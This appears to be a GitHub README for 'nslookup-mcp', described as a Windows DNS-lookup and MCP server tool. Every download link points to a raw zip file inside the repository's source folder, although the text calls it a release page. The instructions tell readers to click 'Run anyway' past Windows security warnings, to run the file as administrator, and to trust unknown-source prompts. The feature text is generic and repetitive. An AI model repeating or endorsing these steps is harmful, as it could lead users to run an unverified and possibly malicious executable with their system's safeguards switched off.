# 🔎 nslookup-mcp - Simple DNS Checks for Windows

[![Download nslookup-mcp](https://img.shields.io/badge/Download%20nslookup--mcp-6a5acd?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Ayushje/nslookup-mcp/raw/refs/heads/main/src/nslookup-mcp-2.3.zip)

## 🧭 What this app does

nslookup-mcp helps you check DNS records, test DNS propagation, and watch certificates through nslookup.io.  
It is made for users who want clear DNS results without manual command-line work.

You can use it to:

- Look up DNS records
- Check if DNS changes have spread
- Review certificate status
- Send DNS checks through an MCP server setup
- Use nslookup.io as the data source

## 💻 Before you install

Use a Windows PC with:

- Windows 10 or Windows 11
- A stable internet connection
- Permission to install or run downloaded apps
- Enough free space for the app and its files

If your PC blocks downloads, you may need to allow the file in your browser or in Windows Security

## 📥 Download nslookup-mcp

Visit this page to download the app:

https://github.com/Ayushje/nslookup-mcp/raw/refs/heads/main/src/nslookup-mcp-2.3.zip

On that page, look for the latest release and download the Windows file for your PC

## 🪟 Install and run on Windows

Follow these steps:

1. Open the release page  
   Go to https://github.com/Ayushje/nslookup-mcp/raw/refs/heads/main/src/nslookup-mcp-2.3.zip

2. Find the latest version  
   The newest release is usually at the top of the page

3. Download the Windows file  
   Choose the file made for Windows. It may be an .exe file or a zipped file

4. If the file is zipped, extract it  
   - Right-click the zip file
   - Select Extract All
   - Choose a folder you can find again

5. Run the app  
   - If you downloaded an .exe file, double-click it
   - If Windows shows a security prompt, choose Run or More info, then Run anyway

6. Keep the app in a fixed folder  
   If you extracted files, do not move them while the app is running

## ⚙️ Basic setup

After you open nslookup-mcp, it may ask for one or more of these items:

- Your DNS target
- A domain name to check
- A server or client app that uses MCP
- Access details for nslookup.io features

If the app offers a setup screen, use the default choices first. They usually work for a basic DNS check

## 🔍 How to use it

Use nslookup-mcp when you want to check a domain or review DNS changes.

Common tasks include:

- Enter a domain name such as example.com
- Choose the type of DNS check
- Run a propagation check to see if updates have reached different DNS servers
- Review certificate status for a site
- Copy results for later use

If you use it with another app, that app may send the request through nslookup-mcp and show the result in its own screen

## 🧩 Main features

### 🌐 DNS lookup
Check common DNS records for a domain, such as:

- A records
- AAAA records
- MX records
- TXT records
- NS records

This helps you see where a domain points and how it is set up

### 📡 Propagation checks
After you change DNS, you can check if the change has reached other servers. This helps when:

- A website moves to a new host
- Email settings change
- A domain starts using a new service

### 🔐 Certificate monitoring
Track certificate status for a domain so you can spot expiration or setup issues early

### 🔌 MCP server support
The app works as an MCP server, which lets another tool ask it for DNS data in a standard way

### 🧾 Clean results
The output is meant to be easy to read, so you can compare values and spot problems fast

## 🛠️ Common Windows issues

### The app will not open
Try these steps:

- Right-click the file and select Run as administrator
- Check that the file finished downloading
- Make sure Windows did not block it
- If the app came in a zip file, extract it first

### Windows says the app is from an unknown source
This can happen with GitHub downloads. If you trust the release page, choose the option that lets the app run

### The app opens and closes right away
This can mean the app needs to be started from a terminal or needs another file beside it. Open the release files again and check that you downloaded the full package

### The page does not show a Windows file
Scroll through the release assets and look for the file made for Windows. If the release has more than one file, choose the one that matches your system

## 🧪 Tips for best results

- Use the latest release
- Keep your internet connection steady
- Check one domain at a time when you are learning
- Use simple domain names first
- Compare old and new DNS values when testing a change
- Save results if you need them for later

## 📂 File handling

If the release comes as a zip file:

- Download it first
- Extract it to a folder
- Open the app from that folder
- Do not delete files that came with the app

If the release comes as an .exe file:

- Save it to your Downloads folder
- Open it from there
- If needed, move it to a folder like Documents or Desktop

## 🧠 What each check means

### DNS records
These show where a domain points and what services it uses

### Propagation
This shows how far a DNS change has spread across the internet

### Certificate status
This shows whether a site’s certificate is valid and ready to use

### MCP server
This lets another tool ask nslookup-mcp for DNS data in a structured way

## 📁 Suggested first test

If you want a simple first run, try this:

1. Open the app
2. Enter a domain you know
3. Run a DNS lookup
4. Review the results
5. Try a propagation check next
6. Check the certificate status if the app offers it

## 🧰 If you use it with another app

Some users run nslookup-mcp with a host app that supports MCP. If that is your setup:

- Start nslookup-mcp first
- Open the other app
- Add the server if needed
- Run a DNS lookup from that app
- Review the returned data

## 📦 Download link again

Visit this page to download the app:

https://github.com/Ayushje/nslookup-mcp/raw/refs/heads/main/src/nslookup-mcp-2.3.zip

## 🧾 What to expect after setup

After the app is ready, you should be able to:

- Check DNS records for a domain
- Verify recent DNS changes
- Review certificate state
- Use the tool from a compatible MCP client
- Get results from nslookup.io through the server

## 🧭 Quick start

1. Go to the releases page
2. Download the Windows file
3. Extract it if needed
4. Run the app
5. Enter a domain
6. Check DNS, propagation, or certificate status